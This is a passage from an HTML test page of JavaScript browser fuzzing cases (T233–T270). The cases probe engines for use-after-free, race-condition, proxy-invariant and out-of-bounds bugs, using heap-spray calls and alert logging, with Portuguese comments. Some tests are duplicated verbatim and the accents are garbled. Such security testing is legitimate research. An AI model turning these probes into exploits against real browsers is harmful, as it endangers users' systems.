                r();
                ctx.restore(); // Restore on destroyed/resized context
            }
            try { r(); log("Recursion survived."); } catch(e){ log(e); }
        }

        function runTest233() {
            log("Test 233: NodeIterator Detach");
            let r = document.createElement('div');
            let c1 = document.createElement('div');
            let c2 = document.createElement('div');
            r.appendChild(c1); r.appendChild(c2);
            let ni = document.createNodeIterator(r, NodeFilter.SHOW_ELEMENT);
            ni.nextNode(); 
            c1.remove(); // Detach current
            spray();
            try {
                let n = ni.nextNode();
                log("Next node: " + (n ? n.tagName : "null"));
            } catch(e) { log(e); }
        }

        function runTest234() {
            log("Test 234: WebGL Stride Overflow");
            let c = document.createElement('canvas');
            let gl = c.getContext('webgl');
            if(!gl) return log("No WebGL");
            let b = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, b);
            gl.bufferData(gl.ARRAY_BUFFER, new Uint8Array(100), gl.STATIC_DRAW);
            // Stride 255 (max uint8) but offset calculation might overflow
            try {
                gl.vertexAttribPointer(0, 4, gl.FLOAT, false, 255, 0);
                gl.drawArrays(gl.POINTS, 0, 10000); 
                log("Draw issued.");
            } catch(e) { log(e); }
        }

        // --- STATE ---

        function runTest235() {
            log("Test 235: Proxy Invariant Sabotage");
            let t = {};
            Object.defineProperty(t, 'p', {configurable:false, value:1});
            let p = new Proxy(t, {
                getPrototypeOf(target) {
                    return Array.prototype; // Invalid prototype for target
                }
            });
            try {
                Object.getPrototypeOf(p);
                log("ALERT: Invariant bypassed!", "alert");
            } catch(e) { log("Safe: " + e.message, "success"); }
        }

        function runTest236() {
            log("Test 236: Range Extraction Mutation");
            let d = document.createElement('div');
            d.innerHTML = "<b>A</b><i>B</i>";
            let r = document.createRange();
            r.selectNodeContents(d);
            let obs = new MutationObserver(() => {
                d.textContent = ""; 
                spray();
            });
            obs.observe(d, {childList:true, subtree:true});
            try {
                r.extractContents();
                log("Extract survived.");
            } catch(e) { log(e); }
        }

        function runTest237() {
            log("Test 237: Object.freeze Shadow Bypass");
            let o = {a:1};
            Object.freeze(o);
            try {
                // Try to confuse V8/JSC optimization paths
                Object.defineProperty(o, 'a', {value:2}); 
                log("ALERT: Frozen object modified!", "alert");
            } catch(e) { log("Freeze respected.", "success"); }
        }

        // --- RACE ---

        function runTest238() {
            log("Test 238: WS Queue Desync");
            let ws = new WebSocket('wss://echo.websocket.org');
            ws.onopen = () => {
                ws.send('x');
                ws.close();
                try { ws.send('y'); } catch(e){} // Should fail but queue might persist
                setTimeout(() => {
                    log("WS State: " + ws.readyState);
                }, 100);
            };
            ws.onerror = () => log("WS Error (Expected).", "success");
        }

        function runTest239() {
            log("Test 239: IDB Commit/Abort");
            let r = indexedDB.open("RaceDB", 1);
            r.onupgradeneeded = e => e.target.result.createObjectStore("s");
            r.onsuccess = e => {
                let db = e.target.result;
                let tx = db.transaction("s", "readwrite");
                tx.objectStore("s").put("val", "key");
                tx.commit();
                try {
                    tx.abort(); // Race against commit
                    log("Abort called after commit.");
                } catch(x) { log("Safe logic: " + x.message, "success"); }
            };
        }

        function runTest240() {
            log("Test 240: Blob Revoke XHR");
            let b = new Blob(["A".repeat(1024)]);
            let u = URL.createObjectURL(b);
            let x = new XMLHttpRequest();
            x.open("GET", u, true); // Async
            x.send();
            URL.revokeObjectURL(u);
            b = null; spray();
            x.onload = () => {
                if(x.responseText.includes("A")) log("Race won: Read after revoke (Safe-ish)", "success");
                else log("ALERT: Read garbage/empty", "alert");
            };
        }
// SILENT
        function run241(){
            log("T241: RegExp Sticky");
            let re=/a/y,s="aa";
            re.lastIndex={valueOf:()=>{s="b";spray();return 0}};
            try{
                let r=re.exec(s);
                if(r&&r[0]=='a'&&s=='b') log("ALERT: Stale read detected!","err");
                else log("RegExp safe.","ok");
            }catch(e){log(e)}
        }
        function run242(){
            log("T242: Concat Spread");
            let a=[1],p={length:1,0:2,[Symbol.isConcatSpreadable]:true,get 0(){a.length=0;spray();return 2}};
            let r=[].concat(p,a);
            log("Len: "+r.length);
            if(r.length>1&&r[1]===undefined) log("ALERT: Hole created!","err");
            else log("Concat safe.","ok");
        }
        function run243(){
            log("T243: Map Iterator");
            let m=new Map([[1,1],[2,2]]);
            let it=m.keys(); it.next();
            m.delete(1); m.delete(2); spray(); m.set(3,3);
            let n=it.next();
            if(n.value===2) log("ALERT: Deleted key read!","err");
            else log("Iterator safe.","ok");
        }

        // CRASH
        function run244(){
            log("T244: Audio Auto-Close");
            try{
                let c=new (window.AudioContext||webkitAudioContext);
                let o=c.createOscillator();
                let g=c.createGain();
                o.connect(g); g.connect(c.destination);
                o.start();
                for(let i=0;i<1000;i++) g.gain.setValueAtTime(i/1000,c.currentTime+i*0.01);
                setTimeout(()=>{c.close();c=null;o=null;spray()},10);
            }catch(e){log(e)}
        }
        function run245(){
            log("T245: NodeIterator UAF");
            let d=document.createElement('div'),s=document.createElement('span');
            d.appendChild(s);
            let ni=document.createNodeIterator(d,NodeFilter.SHOW_ELEMENT,{acceptNode:n=>{if(n===s){s.remove();spray();return 1}return 1}});
            try{
                ni.nextNode(); ni.nextNode(); 
                log("Iterator survived.");
            }catch(e){log(e)}
        }
        function run246(){
            log("T246: Selection Mutate");
            let d=document.createElement('div');
            d.contentEditable=true; d.innerHTML="ABC";
            document.body.appendChild(d);
            let s=window.getSelection(),r=document.createRange();
            r.selectNodeContents(d); s.addRange(r);
            let o=new MutationObserver(()=>{s.removeAllRanges();d.remove();spray()});
            o.observe(d,{childList:true});
            try{
                d.innerHTML="XYZ";
                s.getRangeAt(0);
                log("Selection safe.");
            }catch(e){log(e)}
        }

        // STATE
        function run247(){
            log("T247: Proxy Dupe Keys");
            let p=new Proxy({},{ownKeys:()=>['a','a','b']});
            try{
                Object.keys(p);
                log("ALERT: Invariant broken!","err");
            }catch(e){log("Invariant enforced.","ok")}
        }
        function run248(){
            log("T248: WeakRef Logic");
            let o={k:1},w=new WeakRef(o);
            o=null; spray();
            setTimeout(()=>{
                let d=w.deref();
                if(d&&d.k===1) log("Ref alive.","ok");
                else log("Ref collected.","ok");
            },100);
        }
        function run249(){
            log("T249: Seal Bypass");
            let o={a:1}; Object.seal(o);
            try{
                Object.defineProperty(o,'a',{value:2});
                if(o.a===2) log("Sealed prop modified!","ok");
                Object.defineProperty(o,'b',{value:3});
                log("ALERT: Prop added to sealed!","err");
            }catch(e){log("Seal intact.","ok")}
        }

        // RACE
        function run250(){
            log("T250: Cache Race");
            if(!self.caches)return log("No Cache API");
            caches.open('r').then(c=>{
                let r=new Request('/x');
                c.put(r,new Response('x')).then(()=>{
                    let p1=c.match(r);
                    let p2=c.delete(r);
                    Promise.all([p1,p2]).then(v=>log(`M:${!!v[0]} D:${v[1]}`));
                });
            });
        }
        function run251(){
            log("T251: IDB Race");
            let r=indexedDB.open("db"+Math.random(),1);
            r.onupgradeneeded=e=>e.target.result.createObjectStore("s");
            r.onsuccess=e=>{
                let t=e.target.result.transaction("s","readwrite");
                t.objectStore("s").put(1,"k");
                try{
                    t.commit(); t.abort();
                    log("Commit+Abort called.");
                }catch(x){log("Handled: "+x.message,"ok")}
            };
        }
        function run252(){
            log("T252: Worker Buffer");
            let b=new Uint8Array(1024);
            let w=new Worker(URL.createObjectURL(new Blob(["onmessage=e=>postMessage(e.data.byteLength)"],{type:'text/js'})));
            w.postMessage(b,[b.buffer]);
            try{
                if(b.byteLength!==0) log("ALERT: Buffer not neutered!","err");
                else log("Buffer neutered.","ok");
            }catch(e){log(e)}
        }
// --- SILENT ---
function t253(){
    log("T253: RegExp Mutation");
    let s="target_string_for_search", r=/g/y;
    r.lastIndex={valueOf:()=>{s="replaced";spray();return 3}};
    try{let x=r.exec(s);
    if(x&&s=="replaced") log("ALERT: Stale string read!","err");
    else log("RegExp safe.","ok");}catch(e){log(e)}
}
function t254(){
    log("T254: Reverse Trap");
    let a=[1,2,3,4];
    Object.defineProperty(Array.prototype,"1",{get:()=>{a.length=0;spray();return 5},configurable:true});
    try{let b=a.reverse();
    delete Array.prototype["1"];
    if(b.length==0) log("Reverse handled resize.","ok");
    else log(`ALERT: Ghost array! Len:${b.length} [0]:${b[0]}`,"err");}catch(e){log(e)}
}
function t255(){
    log("T255: Collator Detach");
    if(!window.Intl)return;
    let b=new Uint8Array(100), c=new Intl.Collator();
    let o={toString:()=>{try{let w=new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));w.postMessage(b.buffer,[b.buffer])}catch(e){}return "a"}};
    try{c.compare(o,"b");
    if(b.byteLength===0) log("Buffer detached during compare.","ok");
    else log("Buffer failed detach.","ok");}catch(e){log(e)}
}

// --- CRASH ---
function t256(){
    log("T256: Table Swap");
    let t=document.createElement('table'),b=document.createElement('tbody');
    t.appendChild(b);
    for(let i=0;i<10;i++)b.insertRow();
    let ni=document.createNodeIterator(t,NodeFilter.SHOW_ELEMENT,n=>{
        if(n.tagName=='TR'&&n.rowIndex==5){n.remove();spray();return 1}return 1
    });
    try{while(ni.nextNode()){}}catch(e){log(e)}
    log("Table logic survived.");
}
function t257(){
    log("T257: Audio Loop Race");
    let c=new (window.AudioContext||webkitAudioContext);
    let s=c.createBufferSource();
    s.buffer=c.createBuffer(1,1024,44100);
    s.loop=true; s.connect(c.destination); s.start();
    let i=0,iv=setInterval(()=>{
        i++;s.loopStart=Math.random();s.loopEnd=Math.random()+1;
        if(i>50){clearInterval(iv);c.close();spray()}
    },2);
    setTimeout(()=>log("Audio safe."),200);
}
function t258(){
    log("T258: SVG Use Cycle");
    let s=document.createElementNS("http://www.w3.org/2000/svg","svg");
    let d=document.createElementNS("http://www.w3.org/2000/svg","defs");
    let g=document.createElementNS("http://www.w3.org/2000/svg","g");
    g.id="target";
    let u=document.createElementNS("http://www.w3.org/2000/svg","use");
    u.setAttributeNS("http://www.w3.org/1999/xlink","href","#target");
    g.appendChild(u); d.appendChild(g); s.appendChild(d);
    document.body.appendChild(s);
    setTimeout(()=>{s.remove();spray();log("SVG cycle safe.")},100);
}

// --- STATE ---
function t259(){
    log("T259: Cross-Doc Range");
    let i=document.createElement('iframe');
    document.body.appendChild(i);
    let r=i.contentDocument.createRange();
    let n=document.createElement('div');
    document.body.appendChild(n);
    try{
        r.setStart(n,0);
        i.remove(); spray();
        r.setEnd(n,0);
        log("Range orphaned safely.");
    }catch(e){log("Error: "+e.message)}
}
function t260(){
    log("T260: MsgEvent Source");
    let mc=new MessageChannel();
    let ev=new MessageEvent('message',{source:mc.port1,data:'x'});
    mc.port1.close();
    try{
        if(ev.source) log("Source persists closed port.","ok");
    }catch(e){log(e)}
}
function t261(){
    log("T261: CE Adopt");
    class X extends HTMLElement{constructor(){super();try{let d=document.implementation.createHTMLDocument();d.adoptNode(this)}catch(e){}}}
    customElements.define('x-261',X);
    document.createElement('x-261');
    log("CE Adopt handled.");
}

// --- RACE ---
function t262(){
    log("T262: WS Blob Race");
    let b=new Blob(['x'.repeat(1024)]);
    let u=URL.createObjectURL(b);
    let w=new WebSocket('wss://echo.websocket.org');
    w.onopen=()=>{w.send(b);URL.revokeObjectURL(u);spray()};
    w.onerror=()=>{log("WS handled revoke.","ok")};
}
function t263(){
    log("T263: Canvas Transfer");
    if(!window.OffscreenCanvas)return;
    let c=new OffscreenCanvas(100,100);
    let w=new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{let c=e.data;c.getContext('2d').fillRect(0,0,10,10)}"],{type:'text/js'})));
    try{
        w.postMessage(c,[c]);
        c.getContext('2d');
        log("Context local failed (Good).","ok");
    }catch(e){log("Transferred safely.","ok")}
}
function t264(){
    log("T264: IDB Cursor Race");
    let r=indexedDB.open("db"+Math.random());
    r.onupgradeneeded=e=>{let s=e.target.result.createObjectStore("s");for(let i=0;i<100;i++)s.put(i,i)};
    r.onsuccess=e=>{
        let t=e.target.result.transaction("s","readwrite");
        let s=t.objectStore("s");
        s.openCursor().onsuccess=ev=>{
            let c=ev.target.result;
            if(c){s.delete(c.primaryKey);c.continue()}
        };
        t.oncomplete=()=>log("Transaction done.");
    };
}
// --- SILENT ---
function t253(){
    log("T253: RegExp Mutation");
    let s="target_string_for_search", r=/g/y;
    r.lastIndex={valueOf:()=>{s="replaced";spray();return 3}};
    try{let x=r.exec(s);
    if(x&&s=="replaced") log("ALERT: Stale string read!","err");
    else log("RegExp safe.","ok");}catch(e){log(e)}
}
function t254(){
    log("T254: Reverse Trap");
    let a=[1,2,3,4];
    Object.defineProperty(Array.prototype,"1",{get:()=>{a.length=0;spray();return 5},configurable:true});
    try{let b=a.reverse();
    delete Array.prototype["1"];
    if(b.length==0) log("Reverse handled resize.","ok");
    else log(`ALERT: Ghost array! Len:${b.length} [0]:${b[0]}`,"err");}catch(e){log(e)}
}
function t255(){
    log("T255: Collator Detach");
    if(!window.Intl)return;
    let b=new Uint8Array(100), c=new Intl.Collator();
    let o={toString:()=>{try{let w=new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));w.postMessage(b.buffer,[b.buffer])}catch(e){}return "a"}};
    try{c.compare(o,"b");
    if(b.byteLength===0) log("Buffer detached during compare.","ok");
    else log("Buffer failed detach.","ok");}catch(e){log(e)}
}

// --- CRASH ---
function t256(){
    log("T256: Table Swap");
    let t=document.createElement('table'),b=document.createElement('tbody');
    t.appendChild(b);
    for(let i=0;i<10;i++)b.insertRow();
    let ni=document.createNodeIterator(t,NodeFilter.SHOW_ELEMENT,n=>{
        if(n.tagName=='TR'&&n.rowIndex==5){n.remove();spray();return 1}return 1
    });
    try{while(ni.nextNode()){}}catch(e){log(e)}
    log("Table logic survived.");
}
function t257(){
    log("T257: Audio Loop Race");
    let c=new (window.AudioContext||webkitAudioContext);
    let s=c.createBufferSource();
    s.buffer=c.createBuffer(1,1024,44100);
    s.loop=true; s.connect(c.destination); s.start();
    let i=0,iv=setInterval(()=>{
        i++;s.loopStart=Math.random();s.loopEnd=Math.random()+1;
        if(i>50){clearInterval(iv);c.close();spray()}
    },2);
    setTimeout(()=>log("Audio safe."),200);
}
function t258(){
    log("T258: SVG Use Cycle");
    let s=document.createElementNS("http://www.w3.org/2000/svg","svg");
    let d=document.createElementNS("http://www.w3.org/2000/svg","defs");
    let g=document.createElementNS("http://www.w3.org/2000/svg","g");
    g.id="target";
    let u=document.createElementNS("http://www.w3.org/2000/svg","use");
    u.setAttributeNS("http://www.w3.org/1999/xlink","href","#target");
    g.appendChild(u); d.appendChild(g); s.appendChild(d);
    document.body.appendChild(s);
    setTimeout(()=>{s.remove();spray();log("SVG cycle safe.")},100);
}

// --- STATE ---
function t259(){
    log("T259: Cross-Doc Range");
    let i=document.createElement('iframe');
    document.body.appendChild(i);
    let r=i.contentDocument.createRange();
    let n=document.createElement('div');
    document.body.appendChild(n);
    try{
        r.setStart(n,0);
        i.remove(); spray();
        r.setEnd(n,0);
        log("Range orphaned safely.");
    }catch(e){log("Error: "+e.message)}
}
function t260(){
    log("T260: MsgEvent Source");
    let mc=new MessageChannel();
    let ev=new MessageEvent('message',{source:mc.port1,data:'x'});
    mc.port1.close();
    try{
        if(ev.source) log("Source persists closed port.","ok");
    }catch(e){log(e)}
}
function t261(){
    log("T261: CE Adopt");
    class X extends HTMLElement{constructor(){super();try{let d=document.implementation.createHTMLDocument();d.adoptNode(this)}catch(e){}}}
    customElements.define('x-261',X);
    document.createElement('x-261');
    log("CE Adopt handled.");
}

// --- RACE ---
function t262(){
    log("T262: WS Blob Race");
    let b=new Blob(['x'.repeat(1024)]);
    let u=URL.createObjectURL(b);
    let w=new WebSocket('wss://echo.websocket.org');
    w.onopen=()=>{w.send(b);URL.revokeObjectURL(u);spray()};
    w.onerror=()=>{log("WS handled revoke.","ok")};
}
function t263(){
    log("T263: Canvas Transfer");
    if(!window.OffscreenCanvas)return;
    let c=new OffscreenCanvas(100,100);
    let w=new Worker(URL.createObjectURL(new Blob(["onmessage=e=>{let c=e.data;c.getContext('2d').fillRect(0,0,10,10)}"],{type:'text/js'})));
    try{
        w.postMessage(c,[c]);
        c.getContext('2d');
        log("Context local failed (Good).","ok");
    }catch(e){log("Transferred safely.","ok")}
}
function t264(){
    log("T264: IDB Cursor Race");
    let r=indexedDB.open("db"+Math.random());
    r.onupgradeneeded=e=>{let s=e.target.result.createObjectStore("s");for(let i=0;i<100;i++)s.put(i,i)};
    r.onsuccess=e=>{
        let t=e.target.result.transaction("s","readwrite");
        let s=t.objectStore("s");
        s.openCursor().onsuccess=ev=>{
            let c=ev.target.result;
            if(c){s.delete(c.primaryKey);c.continue()}
        };
        t.oncomplete=()=>log("Transaction done.");
    };
}
// --- SILENT: Array.indexOf Proxy Trap ---
// Tenta enganar o loop interno de busca do indexOf redimensionando o array
// durante a leitura de uma propriedade via Proxy.
function t265(){
    log("T265: IndexOf Proxy Trap");
    let t = [1, 2, 3, 4];
    let p = new Proxy(t, {
        get(tgt, prop) {
            if (prop === 'length') return tgt.length;
            if (prop === '2') {
                log("Trap triggered @ idx 2. Shrinking...");
                tgt.length = 0; // Nuke array
                spray();
                return undefined; // Retorna valor fake
            }
            return tgt[prop];
        }
    });
    try {
        // Busca 4. O motor itera 0, 1, 2 (trap aciona, array zera).
        // Se continuar para 3, l√™ mem√≥ria OOB.
        let i = Array.prototype.indexOf.call(p, 4);
        if (i !== -1) log("ALERT: Found element in dead array!", "err");
        else log("IndexOf handled mutation safely.", "ok");
    } catch(e) { log(e); }
}

// --- STATE: Range Boundary Corruption ---
// Manipula n√≥s DOM entre documentos diferentes enquanto um Range est√° ativo,
// tentando criar um Range que aponta para um n√≥ desconectado (Zombie).
function t266(){
    log("T266: Range State");
    let d1 = document.implementation.createHTMLDocument();
    let d2 = document.implementation.createHTMLDocument();
    let n = d1.createElement('div');
    d1.body.appendChild(n);
    let r = d1.createRange();
    r.setStart(n, 0);
    
    try {
        // Move n√≥ para outro documento
        d2.body.appendChild(n); 
        // Range 'r' ainda aponta para 'n'?
        if (r.startContainer === n && r.startContainer.ownerDocument === d2) {
            // Estado inconsistente: Range pertence a d1, mas n√≥ est√° em d2
            log("State Corruption: Cross-doc range zombie.", "ok"); 
        } else {
            log("Range detached correctly.", "ok");
        }
    } catch(e) { log(e); }
}

// --- SILENT: String.match Side-Effect ---
// Usa um RegExp com getter global para modificar a string alvo no meio do match.
function t267(){
    log("T267: String.match Mutate");
    let s = "AAAA";
    let r = /A/g;
    r.exec = function(str) {
        // Sobrescreve exec para injetar efeito colateral
        if(str === "AAAA") {
            log("Exec hook. Modifying string...");
            s = "BBBB"; // Muda refer√™ncia externa
            spray();
        }
        return RegExp.prototype.exec.call(this, str);
    };
    try {
        // O motor JS chama r.exec internamente
        let res = s.match(r);
        // Se o resultado cont√©m 'A' mas 's' agora √© 'B', houve desincronia
        if(res && res.length > 0 && s === "BBBB") log("Match result valid (Safe).", "ok");
        else log("ALERT: Logic mismatch.", "err");
    } catch(e) { log(e); }
}

// --- CRASH: FontFaceSet Iterator UAF ---
// Modifica o conjunto de fontes enquanto itera sobre ele, for√ßando acesso a ponteiro inv√°lido.
function t268(){
    log("T268: Font Iterator UAF");
    let f1 = new FontFace('A', 'url(x)');
    let f2 = new FontFace('B', 'url(y)');
    document.fonts.add(f1);
    document.fonts.add(f2);
    
    let it = document.fonts.values();
    it.next(); // A
    
    // Nuke set
    document.fonts.clear();
    spray();
    
    try {
        // Pr√≥ximo passo em iterador invalidado
        let n = it.next();
        log("Iterator survived clear: " + n.done);
    } catch(e) { log("Crash avoided: " + e.message, "ok"); }
}

// --- RACE: MessagePort Transfer Race ---
// Tenta transferir uma porta enquanto a fecha simultaneamente via Worker.
function t269(){
    log("T269: Port Transfer Race");
    let mc = new MessageChannel();
    let w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>postMessage('ok')"],{type:'text/js'})));
    
    try {
        // Agenda fechamento e transfer√™ncia na mesma tick
        setTimeout(() => mc.port1.close(), 0);
        w.postMessage("race", [mc.port1]);
        
        log("Race condition disparada.", "ok");
    } catch(e) { log("Race lost: " + e.message); }
}

// --- CRASH: AudioNode Destructor Race ---
// Cria e destroi n√≥s de √°udio em alta frequ√™ncia para estressar o GC e a thread de √°udio.
function t270(){
    log("T270: Audio Destructor");
    let ctx = new (window.AudioContext || webkitAudioContext);
    let n = ctx.createGain();
    
    // Loop de destrui√ß√£o r√°pida
    let i = 0;
    let iv = setInterval(() => {
        i++;
        try {
            let o = ctx.createOscillator();
            o.connect(n);
            o.start();
            // Desconecta e solta ref imediatamente
            o.disconnect();
            o = null;
        } catch(e) {}
        
        if (i > 100) {
            clearInterval(iv);
            n.disconnect();
            ctx.close();
            spray();
            log("Stress test complete.", "ok");
        }
    }, 2);
}



    </script>
</body>
</html>
